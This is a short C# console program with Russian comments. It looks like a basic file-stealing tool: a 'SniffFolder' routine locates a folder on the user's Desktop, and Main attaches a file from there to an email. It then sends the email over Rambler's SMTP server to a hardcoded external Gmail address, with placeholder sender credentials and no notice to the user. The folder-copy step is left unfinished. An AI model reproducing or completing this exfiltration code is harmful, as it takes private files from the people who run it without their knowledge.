using ConsoleApp;
using System;
using System.Net;
using System.Net.Mail;
using System.IO;



namespace ConsoleApp
{




    public class SearchFolder
    {
        public static void SniffFolder()
        {

           
        
            string TargetPathFile = $@"{SearchFolder.Searcher()}\Desktop\qwe";


        

        }

        public static string Searcher()
        {
            
            string FolderName = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
       
            return FolderName;
        }
    }
     
}




    class mailDrop
{
    static void Main(string[] args)
    {
        try
        {
            MailAddress From = new MailAddress("почта", "пароль");
            MailAddress To = new MailAddress("dreammavpa@gmail.com");
            MailMessage msg = new MailMessage(From, To);
            msg.Subject = "zxc";
            msg.Body = "zxc";

            SearchFolder.SniffFolder(); /*копи папки*/

            Attachment attachment = new Attachment($@"{SearchFolder.Searcher()}\Desktop\qwe\zxc.txt");
            msg.Attachments.Add(attachment);
            msg.IsBodyHtml = true;
            SmtpClient smtp = new SmtpClient("smtp.rambler.ru", 587);
            smtp.Credentials = new NetworkCredential("почта", "пароль");
            smtp.EnableSsl = true;
            smtp.Send(msg);
            Console.WriteLine("Почта успешно отправлена.");
            Console.ReadLine();



        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка: " + ex.Message);
        }
    }
}


